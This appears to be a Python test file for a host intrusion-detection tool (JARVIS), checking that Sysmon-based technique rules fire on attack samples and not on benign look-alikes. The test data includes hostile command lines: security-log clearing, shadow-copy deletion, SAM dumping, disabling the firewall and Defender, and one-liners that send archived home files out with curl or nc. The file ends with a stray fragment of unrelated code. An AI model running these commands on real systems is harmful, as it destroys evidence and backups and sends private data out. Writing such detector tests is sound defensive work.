"""Process-creation technique rules and the coverage they are allowed to claim.

Invariants:

  * every rule's sample fires through the real detector, and no benign
    look-alike does (a map entry cannot outlive its rule);
  * a rule is keyed on the process that ran the tool, so script text that only
    names a tool reports nothing - including JARVIS's own inline scripts;
  * a discovery command alone is never reported; a burst needs distinct
    techniques from one identified parent inside one window;
  * a command line that can carry a secret is never quoted;
  * a replay through the Windows detector cannot write to the store;
  * the coverage map counts a technique as validated only when its probe fires
    AND a feeding collector is reporting, and stops counting retired techniques.
"""

import json
import os
import tempfile
import time
import unittest
from unittest import mock

from jarvis.collectors.telemetry import sysmon, sysmon_linux, techniques
from jarvis.core.store import Store
from jarvis.intel import feeds
from jarvis.service import attackmap, schedule

# Never ask the live Windows host for Sysmon's service state from a unit test;
# an empty answer judges nothing (sysmon._service_findings).
_status_patch = None


def setUpModule():
    global _status_patch
    from unittest import mock as _mock

    from jarvis.collectors.telemetry import sysmon as _sysmon
    _status_patch = _mock.patch.object(_sysmon, "status", return_value={})
    _status_patch.start()


def tearDownModule():
    _status_patch.stop()

# Every audit JARVIS has; a release from before the per-machine schedule has only JOBS.
ALL_JOBS = getattr(schedule, "ALL_JOBS", schedule.JOBS)

WHEN = "2026-01-01T00:00:00.000Z"
GUID = "{11111111-1111-1111-1111-111111111111}"


def win(pairs, parent=r"C:\Windows\System32\cmd.exe", guid=GUID, when=WHEN):
    return sysmon.audit(events=[{"id": 1, "image": i, "cmdline": c, "time": when,
                                 "parent": parent, "parent_guid": guid} for i, c in pairs])


def linux(pairs, parent="/usr/bin/bash", guid=GUID):
    return sysmon_linux._rules([{"id": 1, "Image": i, "CommandLine": c, "ParentImage": parent,
                                 "ParentProcessGuid": guid} for i, c in pairs])


def replay(platform, pairs, **kw):
    return (win if platform == techniques.WIN else linux)(pairs, **kw)


def tagged(findings):
    return [f for f in findings if f.get("techniques")]


class RuleTableTests(unittest.TestCase):
    def test_every_sample_fires_and_no_lookalike_does(self):
        for rule in techniques.RULES:
            kw = {"parent": rule.sample_parent} if rule.sample_parent else {}
            out = tagged(replay(rule.platform, [rule.sample], **kw))
            self.assertTrue(any(set(rule.tids) <= set(f["techniques"]) for f in out), rule.title)
            for pair in rule.benign:
                hits = [f for f in tagged(replay(rule.platform, [pair]))
                        if f["title"] == techniques.finding_title(rule)]
                self.assertEqual(hits, [], f"{rule.title}: {pair[1]}")

    def test_rules_are_well_formed(self):
        for rule in techniques.RULES:
            self.assertIn(rule.platform, (techniques.WIN, techniques.LINUX))
            self.assertIn(rule.severity, ("critical", "high", "medium", "low"))
            self.assertTrue(all(t.startswith("T") and t[1:].isdigit() for t in rule.tids), rule.title)
            self.assertEqual([i for i in rule.images if i != i.lower() or i.endswith(".exe")], [])
            rule.regex()

    def test_script_text_naming_a_tool_reports_nothing(self):
        # What JARVIS's own collectors look like: a whole script on the command line.
        script = ("powershell.exe -NoProfile -NonInteractive -Command \"$o=@{}; "
                  "vssadmin list shadows; reg save HKLM\\SAM x; netsh advfirewall set allprofiles "
                  "state off; wevtutil cl Security; sc stop WinDefend; cmdkey /list; "
                  "Get-WmiObject -Namespace root\\subscription -Class __EventFilter\"")
        ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        self.assertEqual(tagged(win([(ps, script)])), [])
        shell = ("bash -c 'grep -r \"stratum+tcp://\" notes; echo GetUserSPNs.py transfer.sh; "
                 "cat <<\"EOF\"\nunset HISTFILE\nEOF\n'")
        self.assertEqual(tagged(linux([("/usr/bin/bash", shell)])), [])

    def test_secret_bearing_command_lines_are_never_quoted(self):
        cases = [(techniques.WIN, r"C:\Windows\System32\net.exe", "net user eve Hunter2! /add"),
                 (techniques.WIN, r"C:\Program Files\7-Zip\7z.exe", "7z a -pHunter2! o.7z C:\\d"),
                 (techniques.LINUX, "/usr/bin/zip", "zip -r -P Hunter2! /tmp/o.zip /home/u")]
        for platform, image, cmd in cases:
            out = tagged(replay(platform, [(image, cmd)]))
            self.assertTrue(out, cmd)
            self.assertFalse(any("Hunter2" in json.dumps(f) for f in out), cmd)

    def test_quoted_span_is_bounded(self):
        long = "wevtutil cl Security " + "A" * 5000
        f = tagged(win([(r"C:\Windows\System32\wevtutil.exe", long)]))[0]
        self.assertLess(len(f["detail"]), 400)

    def test_repeats_fold_into_one_finding(self):
        out = tagged(win([(r"C:\Windows\System32\wevtutil.exe", "wevtutil cl Security")] * 5))
        self.assertEqual(len(out), 1)
        self.assertIn("5 times", out[0]["detail"])


class ParentAndNetworkTests(unittest.TestCase):
    PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

    def test_the_parent_decides_not_the_child(self):
        word = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
        hit = tagged(win([(self.PS, "powershell -c calc")], parent=word))
        self.assertEqual([f["techniques"] for f in hit], [["T1203"]])
        for parent in (r"C:\Windows\explorer.exe", r"C:\Windows\System32\cmd.exe", ""):
            self.assertEqual(tagged(win([(self.PS, "powershell -c calc")], parent=parent)), [], parent)
        # A browser is a different parent with its own rule, and it is not a document application.
        chrome = tagged(win([(self.PS, "powershell -c calc")],
                            parent=r"C:\Program Files\Google\Chrome\chrome.exe"))
        self.assertEqual([f["techniques"] for f in chrome], [["T1189"]])
        self.assertIn("powershell -c calc", chrome[0]["detail"])        # the command, not one letter
        # Browsers start cmd.exe for their own helpers all day; that is not reported.
        self.assertEqual(tagged(win([(r"C:\Windows\System32\cmd.exe", "cmd /d /c helper.bat")],
                                    parent=r"C:\Program Files\Google\Chrome\chrome.exe")), [])
        # A document application starting an ordinary program is not it either.
        self.assertEqual(tagged(win([(r"C:\Windows\System32\splwow64.exe", "splwow64 8192")],
                                    parent=word)), [])

    def test_server_and_spooler_shells_are_critical(self):
        cmd = (r"C:\Windows\System32\cmd.exe", "cmd /c whoami")
        for parent, tid in ((r"C:\Windows\System32\inetsrv\w3wp.exe", "T1190"),
                            (r"C:\Windows\System32\spoolsv.exe", "T1068")):
            out = tagged(win([cmd], parent=parent))
            self.assertEqual(len(out), 1)
            self.assertEqual(out[0]["severity"], "critical")
            self.assertIn(tid, out[0]["techniques"])

    def smb(self, dest, port="445", initiated=True):
        return tagged(sysmon.audit(events=[{"id": 3, "image": r"C:\Windows\explorer.exe",
                                            "dest": dest, "dport": port, "initiated": initiated,
                                            "time": WHEN}]))

    def test_only_outbound_public_file_share_connections_are_reported(self):
        self.assertEqual([f["techniques"] for f in self.smb("8.8.4.4")], [["T1187"]])
        self.assertEqual(len(self.smb("8.8.4.4", initiated=None)), 1)     # direction unknown: kept
        for dest, port, initiated in (("192.168.1.9", "445", True), ("10.0.0.4", "139", True),
                                      ("8.8.4.4", "443", True), ("8.8.4.4", "445", False),
                                      ("8.8.4.4", "445", "false"), ("not-an-ip", "445", True),
                                      ("", "445", True)):
            self.assertEqual(self.smb(dest, port, initiated), [], (dest, port, initiated))

    def lookups(self, n, status=techniques.NXDOMAIN, guid="{9}", when=WHEN, names=None):
        return [{"id": 22, "image": r"C:\t\a.exe", "process_guid": guid, "dns_status": status,
                 "query": (names[i] if names else f"n{i}.example"), "time": when} for i in range(n)]

    def test_generated_domain_burst_needs_distinct_nonexistent_names_from_one_process(self):
        n = techniques.DGA_NAMES
        self.assertEqual(len(tagged(sysmon.audit(events=self.lookups(n)))), 1)
        self.assertEqual(tagged(sysmon.audit(events=self.lookups(n - 1))), [])
        self.assertEqual(tagged(sysmon.audit(events=self.lookups(n * 3, status="9701"))), [])
        self.assertEqual(tagged(sysmon.audit(events=self.lookups(n * 3, status="0"))), [])
        same = self.lookups(n * 3, names=["typo.example"] * (n * 3))        # one name, retried
        self.assertEqual(tagged(sysmon.audit(events=same)), [])
        split = self.lookups(n // 2, guid="{1}") + self.lookups(n // 2, guid="{2}")
        self.assertEqual(tagged(sysmon.audit(events=split)), [])


class RegistryRuleTests(unittest.TestCase):
    def write(self, image, key, details):
        return tagged(sysmon.audit(events=[{"id": 13, "image": image, "reg_key": key,
                                            "reg_details": details, "time": WHEN}]))

    def test_every_registry_sample_fires_and_no_lookalike_does(self):
        for rule in techniques.REG_RULES:
            out = self.write(*rule.sample)
            self.assertTrue(any(set(rule.tids) <= set(f["techniques"]) for f in out), rule.title)
            for sample in rule.benign:
                # Not reported as this rule's technique. The registry family watch
                # (regwatch, 2026-11-10) may report the same write for another reason:
                # a command-line tool changed the family, whatever the value.
                claimed = [f for f in self.write(*sample) if set(rule.tids) & set(f["techniques"])]
                self.assertEqual(claimed, [], f"{rule.title}: {sample[2]}")

    def test_the_write_is_reported_whatever_program_made_it(self):
        key = (r"HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"
               r"\PublicProfile\EnableFirewall")
        for image in (r"C:\Windows\System32\reg.exe", r"C:\Users\x\AppData\Local\Temp\a.exe", ""):
            out = self.write(image, key, "DWORD (0x00000000)")
            self.assertEqual([f["severity"] for f in out], ["critical"], image)
            self.assertEqual(out[0]["techniques"], ["T1686"])

    def test_a_write_of_the_safe_value_or_an_unrelated_key_is_quiet(self):
        base = r"HKLM\System\CurrentControlSet\Services"
        for key, details in (
                (base + r"\SharedAccess\Parameters\FirewallPolicy\PublicProfile\EnableFirewall", "DWORD (0x00000001)"),
                (base + r"\WinDefend\Start", "DWORD (0x00000002)"),
                (base + r"\Tcpip\Parameters\Interfaces\{1}\DhcpIPAddress", "192.0.2.4"),
                ("", ""), (None, None)):
            self.assertEqual(self.write("svchost.exe", key, details), [], key)

    def test_a_registry_rule_is_a_proven_way_only_where_the_key_is_seen_to_be_recorded(self):
        firewall = techniques.REG_RULES[0]
        self.assertEqual(techniques.ways("T1686", {firewall.title}), techniques.ways("T1686") + 1)
        row = {"id": 13, "image": "svchost.exe", "time": WHEN, "reg_details": "v2.33|Action=Allow",
               "reg_key": r"HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters"
                          r"\FirewallPolicy\FirewallRules\{1}"}
        with tempfile.TemporaryDirectory() as tmp:
            store = Store(os.path.join(tmp, "r.db"))
            try:
                self.assertEqual(attackmap._recorded_registry(store), frozenset())
                sysmon.audit(store=store, events=[row])                 # a replay records nothing
                self.assertEqual(attackmap._recorded_registry(store), frozenset())
                data = {"events": [row], "complete": True, "rareComplete": True}
                with mock.patch.object(sysmon, "_native", return_value=(data, 7)):
                    sysmon.audit(store=store, incremental=True)        # a real run does
                self.assertEqual(attackmap._recorded_registry(store), frozenset({firewall.title}))
                self.assertEqual(attackmap._ways("T1686", attackmap._recorded_registry(store)),
                                 attackmap._ways("T1686") + 1)
                # ... and only while it is recent: an old sighting stops counting.
                store.set_meta(sysmon.REGISTRY_RECORDED_META, json.dumps({firewall.title: 5}))
                self.assertEqual(attackmap._recorded_registry(store), frozenset())
                store.set_meta(sysmon.REGISTRY_RECORDED_META, "not json")
                self.assertEqual(attackmap._recorded_registry(store), frozenset())
            finally:
                store.close()

    def test_ways_counts_separate_rules_and_a_probe_replays_all_of_them(self):
        self.assertGreaterEqual(techniques.ways("T1686"), 3)       # commands and the registry write
        self.assertEqual(techniques.ways("T9999"), 0)
        broken = list(techniques.REG_RULES)
        with mock.patch.object(techniques, "registry", return_value=[]):
            self.assertFalse(attackmap.PROBES["T1686"][0]()[0])   # the registry way alone failing is a regression
        self.assertEqual(broken, list(techniques.REG_RULES))


class DiscoveryTests(unittest.TestCase):
    def test_single_commands_are_silent(self):
        for platform, samples in techniques.DISCOVERY_SAMPLES.items():
            for tid, pair in samples.items():
                self.assertIn(tid, techniques.discovery(*pair, platform))
                self.assertEqual(tagged(replay(platform, [pair])), [], pair[1])

    def test_burst_needs_enough_distinct_techniques(self):
        for platform, samples in techniques.DISCOVERY_SAMPLES.items():
            pairs = list(samples.values())
            below = pairs[:techniques.BURST_TECHNIQUES - 1]
            self.assertEqual(tagged(replay(platform, below * 3)), [])   # repeats do not count
            out = tagged(replay(platform, pairs[:techniques.BURST_TECHNIQUES]))
            self.assertEqual(len(out), 1)
            self.assertEqual(out[0]["severity"], "medium")
            self.assertEqual(len(out[0]["techniques"]), techniques.BURST_TECHNIQUES)

    def test_unidentified_parent_never_forms_a_burst(self):
        for platform, samples in techniques.DISCOVERY_SAMPLES.items():
            pairs = list(samples.values())
            self.assertEqual(tagged(replay(platform, pairs, guid="")), [])
        zero = "{00000000-0000-0000-0000-000000000000}"
        self.assertEqual(tagged(linux(list(techniques.DISCOVERY_SAMPLES["linux"].values()),
                                      guid=zero)), [])

    def test_commands_from_different_parents_or_windows_do_not_pool(self):
        pairs = list(techniques.DISCOVERY_SAMPLES["win"].values())[:6]
        events = [{"id": 1, "image": i, "cmdline": c, "time": WHEN, "parent": "cmd.exe",
                   "parent_guid": "{%d}" % n} for n, (i, c) in enumerate(pairs)]
        self.assertEqual(tagged(sysmon.audit(events=events)), [])
        spread = [{"id": 1, "image": i, "cmdline": c, "parent": "cmd.exe", "parent_guid": GUID,
                   "time": "2026-01-01T%02d:00:00.000Z" % n} for n, (i, c) in enumerate(pairs)]
        self.assertEqual(tagged(sysmon.audit(events=spread)), [])

    def test_linux_build_tooling_is_not_a_burst(self):
        pairs = list(techniques.DISCOVERY_SAMPLES["linux"].values())
        self.assertEqual([f for f in tagged(linux(pairs, parent="/usr/bin/make"))
                          if "burst" in f["title"]], [])


class ReplayTests(unittest.TestCase):
    def test_replay_never_reads_the_machine_or_writes_the_store(self):
        with tempfile.TemporaryDirectory() as tmp:
            store = Store(os.path.join(tmp, "s.db"))
            try:
                with mock.patch.object(sysmon, "_fetch") as fetch, \
                        mock.patch.object(sysmon, "_native") as native, \
                        mock.patch.object(sysmon, "_query_blocked") as blocked:
                    out = sysmon.audit(store=store, incremental=True, events=[
                        {"id": 1, "image": r"C:\Windows\System32\wevtutil.exe",
                         "cmdline": "wevtutil cl Security", "time": WHEN}])
                for called in (fetch, native, blocked):
                    called.assert_not_called()
                self.assertTrue(tagged(out))
                self.assertEqual(store.db.execute("SELECT COUNT(*) FROM sysmon_hits").fetchone()[0], 0)
                self.assertEqual(store.get_meta("sysmon_last_run", ""), "")
            finally:
                store.close()

    def test_existing_rules_still_see_the_replayed_events(self):
        out = sysmon.audit(events=[{"id": 1, "image": r"C:\Windows\System32\vssadmin.exe",
                                    "cmdline": "vssadmin delete shadows /all", "time": WHEN}])
        self.assertTrue(any(f["category"] == "impact" for f in out))
        self.assertEqual(sysmon.audit(hosts=("wsl",), events=[]), [])


class CoverageMapTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.store = Store(os.path.join(self.tmp.name, "s.db"))
        self.addCleanup(self.store.close)
        tids = sorted(set(attackmap.PROBES) | {"T9990"})
        self.store.db.executemany(
            "INSERT INTO attack_techniques(tid,name,tactics,platforms,updated) VALUES(?,?,?,?,?)",
            [(t, t, "execution", "Windows,Linux", 1) for t in tids])
        self.store.commit()

    def snapshot(self, job):
        self.store.db.execute(
            "INSERT OR REPLACE INTO snapshots(kind,ts,duration,error,payload) VALUES(?,?,?,?,?)",
            (job, int(time.time()), 1.0, "", "[]"))
        self.store.commit()

    def levels(self):
        return {t["tid"]: t for t in attackmap.measure(self.store)[1]["techniques"]}

    def test_every_probe_fires_and_names_real_jobs(self):
        for tid, (probe, feeding) in attackmap.PROBES.items():
            fired, what = probe()
            self.assertTrue(fired, f"{tid}: {what}")
            self.assertTrue(feeding, tid)
            self.assertLessEqual(set(feeding), set(ALL_JOBS), tid)
        for label, probe in attackmap.PRECISION.items():
            self.assertTrue(probe()[0], label)
        self.assertLessEqual(techniques.technique_ids(), set(attackmap.PROBES))

    def test_a_firing_rule_behind_a_silent_collector_is_not_validated(self):
        levels = self.levels()
        self.assertEqual({t["level"] for tid, t in levels.items() if tid != "T9990"}, {"claimed"})
        self.assertEqual(levels["T9990"]["level"], "blind")
        self.assertIn("not reporting", levels["T1047"]["evidence"])

    def test_validated_follows_the_collector_that_feeds_the_rule(self):
        self.snapshot("sysmon")
        levels = self.levels()
        self.assertEqual(levels["T1047"]["level"], "validated")      # Windows-only rule
        self.assertEqual(levels["T1611"]["level"], "claimed")        # Linux-only rule
        self.snapshot("sysmon_linux")
        self.assertEqual(self.levels()["T1611"]["level"], "validated")

    def test_burst_only_discovery_is_never_counted_as_validated(self):
        self.assertIn("T1033", attackmap.CONTEXT_ONLY)
        self.assertNotIn("T1047", attackmap.CONTEXT_ONLY)
        self.snapshot("sysmon")
        self.snapshot("sysmon_linux")
        levels = self.levels()
        for tid in attackmap.CONTEXT_ONLY:
            self.assertEqual(levels[tid]["level"], "claimed", tid)
            self.assertIn(attackmap.HELD[tid], levels[tid]["evidence"])
        self.assertIn("never by itself", levels["T1033"]["evidence"])
        with mock.patch.object(techniques, "bursts", return_value=[]):
            self.assertEqual(self.levels()["T1033"]["level"], "regressed")

    def test_a_broken_rule_is_a_regression_not_coverage(self):
        self.snapshot("sysmon")
        with mock.patch.object(techniques, "match", return_value=[]):
            findings, data = attackmap.measure(self.store)
        row = {t["tid"]: t for t in data["techniques"]}["T1047"]
        self.assertEqual(row["level"], "regressed")
        self.assertTrue(any(f["severity"] == "high" and "T1047" in f["title"] for f in findings))

    def test_mappings_to_techniques_the_catalogue_dropped_are_reported(self):
        findings, _ = attackmap.measure(self.store)
        self.assertFalse([f for f in findings if "no longer lists" in f["title"]
                          and "T1047" in f["detail"]])
        self.store.db.execute("DELETE FROM attack_techniques WHERE tid='T1047'")
        self.store.commit()
        findings, _ = attackmap.measure(self.store)
        orphan = [f for f in findings if "no longer lists" in f["title"]]
        self.assertEqual(len(orphan), 1)
        self.assertEqual(orphan[0]["severity"], "low")
        self.assertIn("T1047", orphan[0]["detail"])
        self.store.db.execute("DELETE FROM attack_techniques")
        self.store.commit()
        findings, _ = attackmap.measure(self.store)     # no catalogue: nothing to compare
        self.assertFalse([f for f in findings if "no longer lists" in f["title"]])

    def test_retired_techniques_leave_the_catalogue_only_on_a_full_load(self):
        def catalogue(n, extra=()):
            objs = [{"type": "attack-pattern", "kill_chain_phases": [{"phase_name": "execution"}],
                     "x_mitre_platforms": ["Windows"], "name": f"t{i}",
                     "external_references": [{"source_name": "mitre-attack",
                                              "external_id": f"T{2000 + i}"}]} for i in range(n)]
            return json.dumps({"objects": objs + list(extra)}).encode()
        retired = {"type": "attack-pattern", "x_mitre_deprecated": True, "name": "old",
                   "external_references": [{"source_name": "mitre-attack", "external_id": "T9990"}]}
        feeds._attack(catalogue(3, [retired]), self.store)            # truncated download
        have = {r[0] for r in self.store.db.execute("SELECT tid FROM attack_techniques")}
        self.assertIn("T9990", have)                                  # nothing removed
        self.assertIn("T1047", have)
        feeds._attack(catalogue(feeds.ATTACK_MIN_ROWS, [retired]), self.store)
        have = {r[0] for r in self.store.db.execute("SELECT tid FROM attack_techniques")}
        self.assertNotIn("T9990", have)
        self.assertEqual(len(have), feeds.ATTACK_MIN_ROWS)



class CollectorSeamTests(unittest.TestCase):
    """A probe may hand a collector its evidence; it may never make it fetch."""

    def test_firewall_payload_is_judged_without_asking_windows(self):
        from jarvis.collectors.network import firewall
        with mock.patch.object(firewall, "ps_json") as ps:
            out = firewall.audit_windows(data={"profiles": [], "secReadable": True, "logons": [
                {"type": "10", "user": "a", "ip": "198.51.100.7", "time": WHEN}]})
            ps.assert_not_called()
        self.assertTrue(any("RDP logon succeeded" in f["title"] for f in out))
        with mock.patch.object(firewall, "ps_json", return_value=None) as ps:
            unavailable = firewall.audit_windows()
            ps.assert_called_once()
        self.assertEqual(unavailable[0]["title"], "firewall audit unavailable")

    def test_bruteforce_lines_are_judged_without_reading_logs(self):
        from jarvis.collectors.identity import bruteforce
        with mock.patch.object(bruteforce, "_linux_lines") as read:
            spread = [f"sshd: Failed password for invalid user u{i} from 198.51.100.{i} port 1 ssh2"
                      for i in range(bruteforce.SPIKE_ONE_SOURCE)]
            out = bruteforce._linux(lines=spread)        # many sources, none concentrated
            read.assert_not_called()
        self.assertFalse(any(f["severity"] == "high" for f in out))
        with mock.patch.object(bruteforce, "_linux_lines", return_value=[]) as read:
            self.assertEqual(bruteforce._linux()[0]["severity"], "low")   # unreadable, said so
            read.assert_called_once()

    def test_only_modules_are_judged_in_a_pam_directory(self):
        from jarvis.collectors.persistence import implant
        with tempfile.TemporaryDirectory() as tmp:
            for name in ("notes.txt", "pam_x.so.bak"):
                open(os.path.join(tmp, name), "wb").close()
            with mock.patch.object(implant, "_dpkg_owns", return_value=False):
                self.assertEqual(implant.unowned_pam_modules(dirs=(tmp, tmp + "-missing")), [])
                open(os.path.join(tmp, "pam_x.so"), "wb").close()
                self.assertEqual(len(implant.unowned_pam_modules(dirs=(tmp,))), 1)
            with mock.patch.object(implant, "_dpkg_owns", return_value=True):
                self.assertEqual(implant.unowned_pam_modules(dirs=(tmp,)), [])

    def test_probe_payload_fields_are_ones_the_collection_scripts_emit(self):
        # A probe hands a collector a payload it built. If the PowerShell
        # script stopped emitting a field the probe relies on, the rule would
        # be proven while the real collector fed it nothing.
        from jarvis.core.paths import load_win_script
        for script, fields in (("firewall.ps1", ("logons", "profiles", "secReadable")),
                               ("evasion.ps1", ("drivers", "dns"))):
            text = load_win_script(script)
            for field in fields:
                self.assertRegex(text, r"\b%s\b" % field, f"{script} no longer emits {field}")

    def test_single_tool_and_untested_rules_are_held_not_validated(self):
        for tid in ("T1550", "T1207", "T1606", "T1189", "T1563", "T1484"):
            self.assertIn(tid, attackmap.CONTEXT_ONLY, tid)
            self.assertTrue(attackmap.PROBES[tid][0]()[0], tid)        # the rule itself still fires
            self.assertTrue(attackmap.HELD[tid])
        for tid in ("T1674", "T1495", "T1566"):
            self.assertNotIn(tid, attackmap.CONTEXT_ONLY, tid)

    def test_blind_side_rules_are_counted_as_judged_not_as_built(self):
        held = ("T1571", "T1205", "T1074", "T1080", "T1491", "T1678", "T1497", "T1072", "T1030")
        counted = ("T1039", "T1119", "T1005", "T1029", "T1132", "T1573", "T1095", "T1499", "T1020")
        for tid in held + counted:
            fired, what = attackmap.PROBES[tid][0]()
            self.assertTrue(fired, f"{tid}: {what}")
            self.assertTrue(attackmap.PROBES[tid][1], tid)             # a feeding collector is named
        for tid in held:
            self.assertIn(tid, attackmap.CONTEXT_ONLY, tid)
            self.assertGreater(len(attackmap.HELD[tid]), 20, tid)      # with a reason a person can read
        for tid in counted:
            self.assertNotIn(tid, attackmap.CONTEXT_ONLY, tid)

    def test_unusual_port_judges_the_program_the_address_and_the_port(self):
        ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        self.assertTrue(techniques.odd_port(ps, "8.8.4.4", "4444", True))
        self.assertTrue(techniques.odd_port(ps, "8.8.4.4", 4444, None))            # direction unknown still counts
        for image, dest, port, initiated in (
                (ps, "8.8.4.4", "443", True),                                       # a web port
                (ps, "8.8.4.4", "22", True),                                        # git over ssh
                (ps, "192.168.1.20", "4444", True), (ps, "127.0.0.1", "4444", True),
                (ps, "fe80::1", "4444", True),
                (ps, "8.8.4.4", "4444", False), (ps, "8.8.4.4", "4444", "false"),   # inbound
                (r"C:\Program Files\App\app.exe", "8.8.4.4", "4444", True),        # an ordinary program
                (ps, "", "4444", True), (ps, "not-an-address", "4444", True),
                (ps, "8.8.4.4", "", True), (ps, "8.8.4.4", None, True), ("", "8.8.4.4", "4444", True)):
            self.assertFalse(techniques.odd_port(image, dest, port, initiated), (image, dest, port, initiated))
        out = tagged(sysmon.audit(events=[
            {"id": 3, "image": ps, "dest": "8.8.4.4", "dport": str(port), "initiated": True, "time": WHEN}
            for port in (4444, 4445, 4444)]))
        self.assertEqual([(f["severity"], f["techniques"]) for f in out], [("medium", ["T1571"])])   # one finding per program
        self.assertIn("8.8.4.4:4444", out[0]["detail"])

    def test_raw_socket_rule_runs_on_given_data_and_reads_the_machine_otherwise(self):
        import importlib
        sniffing = importlib.import_module("jarvis.collectors.network.sniffing")
        with mock.patch.object(sniffing, "_capture_procs_linux") as tools, \
                mock.patch.object(sniffing, "packet_socket_scan") as sockets, \
                mock.patch.object(sniffing, "_promisc_ifaces") as promisc:
            def ident(pid, name):
                return "verified" if name in sniffing.PACKET_DAEMONS else "unexpected"
            out = sniffing._linux(tools=[], sockets=[("9", "kworker"), ("7", "NetworkManager")], promisc=[],
                                  identity=ident)
            for reader in (tools, sockets, promisc):
                reader.assert_not_called()                 # a probe never reads this machine
            self.assertEqual([f["title"] for f in out], ["kworker (pid 9) is holding a raw packet socket"])
            tools.return_value, sockets.return_value, promisc.return_value = [], ([("5", "implant")], 0), []
            live = sniffing._linux(identity=lambda pid, name: "unexpected")   # the real path still reads all three
            for reader in (tools, sockets, promisc):
                reader.assert_called_once()
            self.assertEqual([f["severity"] for f in live], ["high"])

    def test_a_search_pattern_or_a_decode_is_not_data_being_sent_out(self):
        for cmd, fires in (
                ("bash -c 'tar cz /home/u/docs | base64 -w0 | curl -d @- https://x.example/p'", True),
                ("bash -c 'cat /etc/hostname | xxd -p | nc 198.51.100.7 9000'", True),
                ("bash -c 'grep -n \"base64\\|ncat\\|socat\" rules.py | head'", False),
                ("bash -c 'curl -s https://x.example/k.b64 | base64 -d > k.bin'", False),
                ("bash -c 'echo hi | base64 | tee out.b64 | wc -c'", False)):
            out = tagged(attackmap._replay(techniques.LINUX, [("/usr/bin/bash", cmd)]))
            self.assertEqual(any("T1132" in f["techniques"] for f in out), fires, cmd)

    def test_a_technique_proven_two_ways_regresses_when_either_fails(self):
        self.assertIn("T1543", attackmap.HAND_PROBES)
        self.assertTrue(attackmap.PROBES["T1543"][0]()[0])
        with mock.patch.object(techniques, "match", return_value=[]):      # the rule table goes quiet
            self.assertFalse(attackmap.PROBES["T1543"][0]()[0])
        self.assertEqual(attackmap._ways("T1543"), 2)                     # a command rule and the Linux detector
        image_path = next(r.title for r in techniques.REG_RULES if "T1543" in r.tids)
        self.assertEqual(attackmap._ways("T1543", {image_path}), 3)       # plus the registry write, once seen recorded
        self.assertEqual(attackmap._ways("T1674"), 1)

    def test_injected_input_is_judged_from_the_store_alone(self):
        import importlib
        analysis = importlib.import_module("jarvis.collectors.host.inputwatch.analysis")
        with tempfile.TemporaryDirectory() as tmp:
            store = Store(os.path.join(tmp, "i.db"))
            try:
                with mock.patch.object(analysis, "ingest") as ingest, \
                        mock.patch.object(analysis, "running") as running:
                    self.assertEqual(analysis.injected_findings(store, 0), [])
                    store.db.execute("INSERT INTO input_events(ts, kind, lower_il, class, fg) "
                                     "VALUES(100, 'move', 0, 'move', 'game.exe')")
                    store.db.execute("INSERT INTO input_events(ts, kind, lower_il, class, fg) "
                                     "VALUES(100, 'punct-key', 0, 'key', 'notepad.exe')")
                    store.commit()
                    out = analysis.injected_findings(store, 0)
                    ingest.assert_not_called()          # the hook's own file is never read
                    running.assert_not_called()
            finally:
                store.close()
        self.assertEqual([f["severity"] for f in out], ["medium"])        # real typing is not "injected"

    def test_valid_accounts_is_held_at_claimed_with_its_reason(self):
        self.assertIn("T1078", attackmap.CONTEXT_ONLY)
        self.assertIn("stolen credential", attackmap.HELD["T1078"])
        self.assertTrue(attackmap.PROBES["T1078"][0]()[0])      # the probe still runs

    def test_gap_report_and_coverage_map_agree_on_what_is_looked_for(self):
        from jarvis.intel import gaps
        self.assertEqual(sorted(set(attackmap.PROBES) - set(gaps.COVERAGE)), [])

    def test_a_retired_id_is_covered_through_its_successors_only(self):
        from jarvis.intel import gaps
        self.assertNotIn("T1562", gaps.COVERAGE)                 # never mapped by itself
        self.assertIn("T1685", gaps._successors("T1562"))
        self.assertIsNone(gaps._successors("T1480"))
        with tempfile.TemporaryDirectory() as tmp:
            store = Store(os.path.join(tmp, "g.db"))
            try:
                for tid in ("T1562.001", "T1480.001"):
                    store.db.execute(
                        """INSERT INTO indicators(kind,value,norm,confidence,topic,context,malware,
                                                  source_url,first_seen,last_seen,source,doc_count,status)
                           VALUES('attack',?,?,'high','','','','',0,0,'exa',3,'active')""", (tid, tid))
                store.db.execute("INSERT INTO attack_techniques(tid,name,tactics,platforms,updated) "
                                 "VALUES('T1480','Execution Guardrails','stealth','Windows',1)")
                store.commit()
                findings, covered, _ = gaps.gaps(store)
            finally:
                store.close()
        self.assertIn("T1562.001", [c[0] for c in covered])
        self.assertEqual([f["title"].split()[0] for f in findings], ["T1480.001"])

    def test_a_claim_exists_only_where_a_detector_backs_it(self):
        from jarvis.intel import gaps
        # T1497 and T1571 were once mapped with nothing behind them and were removed.
        # They are mapped again now that a rule exists, and stay held at claimed.
        for tid in ("T1497", "T1571"):
            self.assertIn(tid, gaps.COVERAGE)
            self.assertTrue(attackmap.PROBES[tid][0]()[0], tid)
            self.assertIn(tid, attackmap.CONTEXT_ONLY)
        for tid in ("T1480", "T1622", "T1041"):                  # nothing looks for these: no claim
            self.assertNotIn(tid, gaps.COVERAGE)
            self.assertNotIn(tid, attackmap.PROBES)

    def test_an_optional_probe_is_absent_when_its_detector_is(self):
        before = dict(attackmap.PROBES)
        try:
            attackmap.PROBES.pop("T9991", None)
            attackmap._optional("T9991", lambda: (True, "x"), ("scan",),
                                lambda: attackmap._has("jarvis.no_such_module"))
            self.assertNotIn("T9991", attackmap.PROBES)
            attackmap._optional("T9991", lambda: (True, "x"), ("scan",), lambda: True)
            self.assertIn("T9991", attackmap.PROBES)
        finally:
            attackmap.PROBES.clear()
            attackmap.PROBES.update(before)


if __name__ == "__main__":
    unittest.main()

DRIVES = {"C": ("Fixed", "NVMe"), "D": ("Fixed", "SATA"), "E": ("Removable", "USB"),
          "F": ("Fixed", "USB"), "Z": ("Network", "")}
ROBOCOPY = r"C:\Windows\System32\Robocopy.exe"


def start(image, cmdline=""):
    return {"id": 1, "image": image, "cmdline": cmdline or image, "time": WHEN}


class RemovableMediaTests(unittest.TestCase):
